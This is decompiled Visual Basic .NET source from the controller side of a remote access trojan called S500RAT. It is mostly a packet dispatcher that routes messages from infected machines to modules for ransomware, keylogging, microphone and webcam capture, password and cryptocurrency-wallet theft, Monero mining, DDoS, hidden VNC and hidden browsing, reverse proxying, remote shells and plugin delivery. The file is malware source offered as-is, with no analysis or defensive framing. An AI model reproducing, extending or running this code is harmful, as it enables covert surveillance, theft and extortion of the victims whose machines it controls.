Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.Threading
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000068 RID: 104
	Public Class DataB
		' Token: 0x060011D4 RID: 4564 RVA: 0x0009F42C File Offset: 0x0009D62C
		Public Sub Read()
			Try
				Dim unpack_msgpack As MsgPack = New MsgPack()
				unpack_msgpack.DecodeFromBytes(Me.data)
				Dim $I1 As ThreadStart
				Dim $I2 As VB$AnonymousDelegate_0
				Dim $IR1 As WaitCallback
				Dim $I3 As VB$AnonymousDelegate_0
				Dim $IR2 As WaitCallback
				Dim $I4 As VB$AnonymousDelegate_0
				Dim $IR3 As WaitCallback
				Dim $I5 As VB$AnonymousDelegate_0
				Dim $IR4 As WaitCallback
				Dim $I7 As VB$AnonymousDelegate_0
				Dim $IR6 As WaitCallback
				Dim $I9 As VB$AnonymousDelegate_0
				Dim $IR8 As WaitCallback
				DataB.form1_0.Invoke(New MethodInvoker(Sub()
					Try
						Dim asString As String = unpack_msgpack.ForcePathObject("Packet").AsString
						Dim num As UInteger = <PrivateImplementationDetails>.ComputeStringHash(asString)
						If num <= 2151320149UI Then
							If num <= 979992697UI Then
								If num <= 468977556UI Then
									If num <= 270274412UI Then
										If num <> 204136435UI Then
											If num <> 234521115UI Then
												If num = 270274412UI Then
													If Operators.CompareString(asString, "FormRansomware", False) = 0 Then
														New FrmRansomware().AddArrary(Me.client_0, unpack_msgpack)
													End If
												End If
											ElseIf Operators.CompareString(asString, "RecoviryPass", False) = 0 Then
												ThreadPool.QueueUserWorkItem(Sub(a0 As Object)
													Me._Lambda$__9-6()
												End Sub)
											End If
										ElseIf Operators.CompareString(asString, "ReportWindow", False) = 0 Then
											New NotifMonitor().AddArrary(Me.client_0, unpack_msgpack)
										End If
									ElseIf num <> 362187054UI Then
										If num <> 390471596UI Then
											If num = 468977556UI Then
												If Operators.CompareString(asString, "FormFun", False) = 0 Then
													New FrmFun().AddArrary(Me.client_0, unpack_msgpack)
												End If
											End If
										ElseIf Operators.CompareString(asString, "GetPlugin", False) = 0 Then
											Dim callBack As WaitCallback
											If $IR8 IsNot Nothing Then
												callBack = $IR8
											Else
												Dim waitCallback As WaitCallback = Sub(a0 As Object)
													Dim vb$AnonymousDelegate_ As VB$AnonymousDelegate_0
													If $I9 IsNot Nothing Then
														vb$AnonymousDelegate_ = $I9
													Else
														Dim vb$AnonymousDelegate_2 As VB$AnonymousDelegate_0 = Sub()
															ListLogs.AddArray("Sending the plugin to client " + Me.client_0.IP + " for the first time please wait..", 2)
															Me.client_0.SendPlugin(unpack_msgpack.ForcePathObject("PLGHash").AsString, unpack_msgpack.ForcePathObject("PLGValue").AsString, True)
														End Sub
														Dim vb$AnonymousDelegate_3 As VB$AnonymousDelegate_0 = vb$AnonymousDelegate_2
														$I9 = vb$AnonymousDelegate_2
														vb$AnonymousDelegate_ = vb$AnonymousDelegate_3
													End If
													vb$AnonymousDelegate_()
												End Sub
												Dim waitCallback2 As WaitCallback = waitCallback
												$IR8 = waitCallback
												callBack = waitCallback2
											End If
											ThreadPool.QueueUserWorkItem(callBack)
										End If
									ElseIf Operators.CompareString(asString, "FormActiveWindows", False) = 0 Then
										New FrmActiveWindows().AddArrary(Me.client_0, unpack_msgpack)
									End If
								ElseIf num <= 659446210UI Then
									If num <> 529077071UI Then
										If num <> 563360128UI Then
											If num = 659446210UI Then
												If Operators.CompareString(asString, "FormKeylogger", False) = 0 Then
													New FrmKeylogger().AddArrary(Me.client_0, unpack_msgpack)
												End If
											End If
										ElseIf Operators.CompareString(asString, "Mic", False) = 0 Then
											New FrmMicrophone().AddArrary(Me.client_0, unpack_msgpack)
										End If
									ElseIf Operators.CompareString(asString, "Active", False) = 0 Then
										ListValue.Active(Me.client_0, unpack_msgpack)
									End If
								ElseIf num <= 859067476UI Then
									If num <> 741848411UI Then
										If num = 859067476UI Then
											If Operators.CompareString(asString, "socketDownload", False) = 0 Then
												New FrmManager().SocketDownload(Me.client_0, unpack_msgpack)
											End If
										End If
									ElseIf Operators.CompareString(asString, "FormInformation", False) = 0 Then
										New FrmInformation().AddArrary(Me.client_0, unpack_msgpack)
									End If
								ElseIf num <> 892121768UI Then
									If num = 979992697UI Then
										If Operators.CompareString(asString, "MiningInfo", False) = 0 Then
											Dim callBack2 As WaitCallback
											If $IR2 IsNot Nothing Then
												callBack2 = $IR2
											Else
												Dim waitCallback3 As WaitCallback = Sub(a0 As Object)
													Dim vb$AnonymousDelegate_ As VB$AnonymousDelegate_0
													If $I3 IsNot Nothing Then
														vb$AnonymousDelegate_ = $I3
													Else
														Dim vb$AnonymousDelegate_2 As VB$AnonymousDelegate_0 = Sub()
															Thread.Sleep(1)
															MiningData.AddArray(Me.client_0, unpack_msgpack)
														End Sub
														Dim vb$AnonymousDelegate_3 As VB$AnonymousDelegate_0 = vb$AnonymousDelegate_2
														$I3 = vb$AnonymousDelegate_2
														vb$AnonymousDelegate_ = vb$AnonymousDelegate_3
													End If
													vb$AnonymousDelegate_()
												End Sub
												Dim waitCallback2 As WaitCallback = waitCallback3
												$IR2 = waitCallback3
												callBack2 = waitCallback2
											End If
											ThreadPool.QueueUserWorkItem(callBack2)
										End If
									End If
								ElseIf Operators.CompareString(asString, "FormStartup", False) = 0 Then
									New FrmStartup().AddArrary(Me.client_0, unpack_msgpack)
								End If
							ElseIf num <= 1847543662UI Then
								If num <= 1257491498UI Then
									If num <> 1017818793UI Then
										If num <> 1231575816UI Then
											If num = 1257491498UI Then
												If Operators.CompareString(asString, "FormPowershell", False) = 0 Then
													New FrmPowerShell().AddArrary(Me.client_0, unpack_msgpack)
												End If
											End If
										ElseIf Operators.CompareString(asString, "webcam", False) = 0 Then
											New FrmCamera().AddArrary(Me.client_0, unpack_msgpack)
										End If
									ElseIf Operators.CompareString(asString, "Reverse Proxy", False) = 0 Then
										New FrmReverseProxy().AddArrary(Me.client_0, unpack_msgpack)
									End If
								ElseIf num <> 1370058150UI Then
									If num <> 1584118120UI Then
										If num = 1847543662UI Then
											If Operators.CompareString(asString, "FormPassword", False) = 0 Then
												New FrmPassword().AddArrary(Me.client_0, unpack_msgpack)
											End If
										End If
									ElseIf Operators.CompareString(asString, "FormClient", False) = 0 Then
										New FrmClient().AddArrary(Me.client_0, unpack_msgpack)
									End If
								ElseIf Operators.CompareString(asString, "Logs", False) = 0 Then
									Try
									Catch value As Exception
										Console.WriteLine(value)
									End Try
								End If
							ElseIf num <= 2010133702UI Then
								If num <> 1898959939UI Then
									If num <> 1907359217UI Then
										If num = 2010133702UI Then
											If Operators.CompareString(asString, "FormHosts", False) = 0 Then
												New FrmHosts().AddArrary(Me.client_0, unpack_msgpack)
											End If
										End If
									ElseIf Operators.CompareString(asString, "FormHRDP", False) = 0 Then
										New FrmHRDP().AddArrary(Me.client_0, unpack_msgpack)
									End If
								ElseIf Operators.CompareString(asString, "FormRemoteDesktop", False) = 0 Then
									New FrmRemoteDesktop().Capture(Me.client_0, unpack_msgpack)
								End If
							ElseIf num <= 2099122684UI Then
								If num <> 2030166299UI Then
									If num = 2099122684UI Then
										If Operators.CompareString(asString, "regManager", False) = 0 Then
											New FrmRegistery().AddArrary(Me.client_0, unpack_msgpack)
										End If
									End If
								ElseIf Operators.CompareString(asString, "FormServices", False) = 0 Then
									New FrmServices().AddArrary(Me.client_0, unpack_msgpack)
								End If
							ElseIf num <> 2142761129UI Then
								If num = 2151320149UI Then
									If Operators.CompareString(asString, "FormCMD", False) = 0 Then
										New FrmCMD().AddArrary(Me.client_0, unpack_msgpack)
									End If
								End If
							ElseIf Operators.CompareString(asString, "Ping", False) = 0 Then
								ListValue.Ping(Me.client_0, unpack_msgpack)
							End If
						ElseIf num <= 3028177386UI Then
							If num <= 2614674993UI Then
								If num <= 2477346862UI Then
									If num <> 2343676115UI Then
										If num <> 2435199219UI Then
											If num = 2477346862UI Then
												If Operators.CompareString(asString, "FormInstalledSoftware", False) = 0 Then
													New FrmInstalledSoftware().AddArrary(Me.client_0, unpack_msgpack)
												End If
											End If
										ElseIf Operators.CompareString(asString, "InfoDLL", False) = 0 Then
											Dim callBack3 As WaitCallback
											If $IR6 IsNot Nothing Then
												callBack3 = $IR6
											Else
												Dim waitCallback4 As WaitCallback = Sub(a0 As Object)
													Dim vb$AnonymousDelegate_ As VB$AnonymousDelegate_0
													If $I7 IsNot Nothing Then
														vb$AnonymousDelegate_ = $I7
													Else
														Dim vb$AnonymousDelegate_2 As VB$AnonymousDelegate_0 = Sub()
															ListLogs.AddArray("Sending the plugin to client " + Me.client_0.IP + " for the first time please wait..", 2)
															Dim pluginHash As String = Me.client_0.GetPluginHash("User ID")
															Me.client_0.SendPlugin(pluginHash, unpack_msgpack.ForcePathObject("ClientName").AsString, False)
														End Sub
														Dim vb$AnonymousDelegate_3 As VB$AnonymousDelegate_0 = vb$AnonymousDelegate_2
														$I7 = vb$AnonymousDelegate_2
														vb$AnonymousDelegate_ = vb$AnonymousDelegate_3
													End If
													vb$AnonymousDelegate_()
												End Sub
												Dim waitCallback2 As WaitCallback = waitCallback4
												$IR6 = waitCallback4
												callBack3 = waitCallback2
											End If
											ThreadPool.QueueUserWorkItem(callBack3)
										End If
									ElseIf Operators.CompareString(asString, "FormMessageBox", False) = 0 Then
										New FrmMessageBox().AddArrary(Me.client_0, unpack_msgpack)
									End If
								ElseIf num <> 2491905683UI Then
									If num <> 2563031293UI Then
										If num = 2614674993UI Then
											If Operators.CompareString(asString, "Screen", False) = 0 Then
												ListValue.ScreenList(Me.client_0, unpack_msgpack)
											End If
										End If
									ElseIf Operators.CompareString(asString, "FormTaskManager", False) = 0 Then
										New FrmTaskManager().AddArrary(Me.client_0, unpack_msgpack)
									End If
								ElseIf Operators.CompareString(asString, "FormOptions", False) = 0 Then
									New FrmOptions().AddArrary(Me.client_0, unpack_msgpack)
								End If
							ElseIf num <= 2856163366UI Then
								If num <> 2619357167UI Then
									If num <> 2737489358UI Then
										If num = 2856163366UI Then
											If Operators.CompareString(asString, "CurrencyInfo", False) = 0 Then
												Dim callBack4 As WaitCallback
												If $IR3 IsNot Nothing Then
													callBack4 = $IR3
												Else
													Dim waitCallback5 As WaitCallback = Sub(a0 As Object)
														Dim vb$AnonymousDelegate_ As VB$AnonymousDelegate_0
														If $I4 IsNot Nothing Then
															vb$AnonymousDelegate_ = $I4
														Else
															Dim vb$AnonymousDelegate_2 As VB$AnonymousDelegate_0 = Sub()
																Thread.Sleep(1)
																GrabberList.AddArray(Me.client_0, unpack_msgpack)
															End Sub
															Dim vb$AnonymousDelegate_3 As VB$AnonymousDelegate_0 = vb$AnonymousDelegate_2
															$I4 = vb$AnonymousDelegate_2
															vb$AnonymousDelegate_ = vb$AnonymousDelegate_3
														End If
														vb$AnonymousDelegate_()
													End Sub
													Dim waitCallback2 As WaitCallback = waitCallback5
													$IR3 = waitCallback5
													callBack4 = waitCallback2
												End If
												ThreadPool.QueueUserWorkItem(callBack4)
											End If
										End If
									ElseIf Operators.CompareString(asString, "FormTCPConnection", False) = 0 Then
										New FrmNetwork().AddArrary(Me.client_0, unpack_msgpack)
									End If
								ElseIf Operators.CompareString(asString, "FormClipboard", False) = 0 Then
									New FrmClipboard().AddArrary(Me.client_0, unpack_msgpack)
								End If
							ElseIf num <= 2874001881UI Then
								If num <> 2858610533UI Then
									If num = 2874001881UI Then
										If Operators.CompareString(asString, "FormChat", False) = 0 Then
											New FrmChat().AddArrary(Me.client_0, unpack_msgpack)
										End If
									End If
								ElseIf Operators.CompareString(asString, "MiningStatue", False) = 0 Then
									Dim callBack5 As WaitCallback
									If $IR1 IsNot Nothing Then
										callBack5 = $IR1
									Else
										Dim waitCallback6 As WaitCallback = Sub(a0 As Object)
											Dim vb$AnonymousDelegate_ As VB$AnonymousDelegate_0
											If $I2 IsNot Nothing Then
												vb$AnonymousDelegate_ = $I2
											Else
												Dim vb$AnonymousDelegate_2 As VB$AnonymousDelegate_0 = Sub()
													Thread.Sleep(1)
													Try
														Dim lockListMining As Object = Setting.LockListMining
														ObjectFlowControl.CheckForSyncLockOnValueType(lockListMining)
														SyncLock lockListMining
															Dim flag2 As Boolean = Me.client_0.MiningDatagridview IsNot Nothing
															If flag2 Then
																Dim flag3 As Boolean = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("MiningStatue").AsString)
																Dim dataGridViewCell As DataGridViewCell = Me.client_0.MiningDatagridview.Cells(7)
																Dim flag4 As Boolean = flag3
																If flag4 Then
																	dataGridViewCell.Style.BackColor = Color.DarkGreen
																	Me.client_0.MiningDatagridview.Cells(7).Value = "Running"
																Else
																	dataGridViewCell.Style.BackColor = Color.DarkRed
																	Me.client_0.MiningDatagridview.Cells(7).Value = "Not running"
																End If
															Else
																Debug.WriteLine("Nothing")
															End If
														End SyncLock
													Catch ex2 As Exception
														Interaction.MsgBox("reeee", MsgBoxStyle.OkOnly, Nothing)
													End Try
												End Sub
												Dim vb$AnonymousDelegate_3 As VB$AnonymousDelegate_0 = vb$AnonymousDelegate_2
												$I2 = vb$AnonymousDelegate_2
												vb$AnonymousDelegate_ = vb$AnonymousDelegate_3
											End If
											vb$AnonymousDelegate_()
										End Sub
										Dim waitCallback2 As WaitCallback = waitCallback6
										$IR1 = waitCallback6
										callBack5 = waitCallback2
									End If
									ThreadPool.QueueUserWorkItem(callBack5)
								End If
							ElseIf num <> 2951518193UI Then
								If num = 3028177386UI Then
									If Operators.CompareString(asString, "FormHVNC", False) = 0 Then
										New FrmHVNC().Capture(Me.client_0, unpack_msgpack)
									End If
								End If
							ElseIf Operators.CompareString(asString, "FormDDos", False) = 0 Then
								New FrmDDos().AddArrary(Me.client_0, unpack_msgpack)
							End If
						ElseIf num <= 3644100786UI Then
							If num <= 3481194405UI Then
								If num <> 3233163102UI Then
									If num <> 3379613997UI Then
										If num = 3481194405UI Then
											If Operators.CompareString(asString, "FormDotNET", False) = 0 Then
												New FrmDotNET().AddArrary(Me.client_0, unpack_msgpack)
											End If
										End If
									ElseIf Operators.CompareString(asString, "FormHiddenBrowser", False) = 0 Then
										New FrmHiddenBrowser().Capture(Me.client_0, unpack_msgpack)
									End If
								ElseIf Operators.CompareString(asString, "ClientInfo", False) = 0 Then
									Dim start As ThreadStart
									If $I1 IsNot Nothing Then
										start = $I1
									Else
										Dim threadStart As ThreadStart = Sub()
											DataList.AddArray(Me.client_0, unpack_msgpack)
										End Sub
										Dim threadStart2 As ThreadStart = threadStart
										$I1 = threadStart
										start = threadStart2
									End If
									New Thread(start) With { .IsBackground = True }.Start()
								End If
							ElseIf num <> 3553991850UI Then
								If num <> 3615377322UI Then
									If num = 3644100786UI Then
										If Operators.CompareString(asString, "fileManager", False) = 0 Then
											New FrmManager().FileManager(Me.client_0, unpack_msgpack)
										End If
									End If
								ElseIf Operators.CompareString(asString, "FormAntiMalware", False) = 0 Then
									New FrmAntiMalware().AddArrary(Me.client_0, unpack_msgpack)
								End If
							ElseIf Operators.CompareString(asString, "FormWiFi", False) = 0 Then
								New FrmWiFi().AddArrary(Me.client_0, unpack_msgpack)
							End If
						ElseIf num <= 3983258362UI Then
							If num <> 3834287222UI Then
								If num <> 3945970519UI Then
									If num = 3983258362UI Then
										If Operators.CompareString(asString, "GetID", False) = 0 Then
											ThreadPool.QueueUserWorkItem(Sub(a0 As Object)
												Me._Lambda$__9-8()
											End Sub)
										End If
									End If
								ElseIf Operators.CompareString(asString, "FormSendFile", False) = 0 Then
									New FrmSendFile().AddArrary(Me.client_0, unpack_msgpack)
								End If
							ElseIf Operators.CompareString(asString, "FormXMR", False) = 0 Then
								New FrmXMR().AddArrary(Me.client_0, unpack_msgpack)
							End If
						ElseIf num <= 4086144241UI Then
							If num <> 4078154518UI Then
								If num = 4086144241UI Then
									If Operators.CompareString(asString, "Error", False) = 0 Then
										Try
											ListLogs.AddArray("Client " + Me.client_0.IP + "  Error :  " + unpack_msgpack.ForcePathObject("Value").AsString, 0)
										Catch value2 As Exception
											Console.WriteLine(value2)
										End Try
									End If
								End If
							ElseIf Operators.CompareString(asString, "FormAdmin", False) = 0 Then
								New FrmAdmin().AddArrary(Me.client_0, unpack_msgpack)
							End If
						ElseIf num <> 4235613692UI Then
							If num = 4275035529UI Then
								If Operators.CompareString(asString, "FormHiddenProgram", False) = 0 Then
									New FrmHiddenProgram().Capture(Me.client_0, unpack_msgpack)
								End If
							End If
						ElseIf Operators.CompareString(asString, "RecoviryPasswords", False) = 0 Then
							Dim callBack6 As WaitCallback
							If $IR4 IsNot Nothing Then
								callBack6 = $IR4
							Else
								Dim waitCallback7 As WaitCallback = Sub(a0 As Object)
									Dim vb$AnonymousDelegate_ As VB$AnonymousDelegate_0
									If $I5 IsNot Nothing Then
										vb$AnonymousDelegate_ = $I5
									Else
										Dim vb$AnonymousDelegate_2 As VB$AnonymousDelegate_0 = Sub()
											Thread.Sleep(1)
											RecoviryPasswords.AddArray(Me.client_0, unpack_msgpack)
										End Sub
										Dim vb$AnonymousDelegate_3 As VB$AnonymousDelegate_0 = vb$AnonymousDelegate_2
										$I5 = vb$AnonymousDelegate_2
										vb$AnonymousDelegate_ = vb$AnonymousDelegate_3
									End If
									vb$AnonymousDelegate_()
								End Sub
								Dim waitCallback2 As WaitCallback = waitCallback7
								$IR4 = waitCallback7
								callBack6 = waitCallback2
							End If
							ThreadPool.QueueUserWorkItem(callBack6)
						End If
					Catch ex As Exception
						ListLogs.AddArray("Client " + Me.client_0.IP + "  Error :  " + ex.Message, 0)
						Debug.WriteLine("Falied")
					End Try
				End Sub))
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060011D5 RID: 4565 RVA: 0x0009F49C File Offset: 0x0009D69C
		Public Shared Function InfoClient(dataGridViewRow_0 As DataGridViewRow) As Object
			Dim right As String = "|'|"
			Dim obj As Object = ""
			Try
				Dim flag As Boolean = dataGridViewRow_0 IsNot Nothing AndAlso dataGridViewRow_0.Tag IsNot Nothing
				If flag Then
					obj = Operators.AddObject(obj, Operators.AddObject(dataGridViewRow_0.Cells(3).Value, right))
					obj = Operators.AddObject(obj, Operators.AddObject(dataGridViewRow_0.Cells(1).Value, right))
					obj = Operators.AddObject(obj, Operators.AddObject(dataGridViewRow_0.Cells(3).Value, right))
					obj = Operators.AddObject(obj, Operators.AddObject(dataGridViewRow_0.Cells(10).Value, right))
					obj = Operators.AddObject(obj, dataGridViewRow_0.Cells(8).Value)
				End If
			Catch ex As Exception
			End Try
			Return obj
		End Function

		' Token: 0x040007DA RID: 2010
		Public Shared form1_0 As FormS500

		' Token: 0x040007DB RID: 2011
		Public Shared IPInformtion As GetIPInfo = New GetIPInfo()

		' Token: 0x040007DC RID: 2012
		Public Shared OutOnlien As Integer

		' Token: 0x040007DD RID: 2013
		Public client_0 As Clients

		' Token: 0x040007DE RID: 2014
		Public data As Byte()

		' Token: 0x040007DF RID: 2015
		Public Shared Key As String

		' Token: 0x040007E0 RID: 2016
		Private Shared L1 As DataList = New DataList()
	End Class
End Namespace
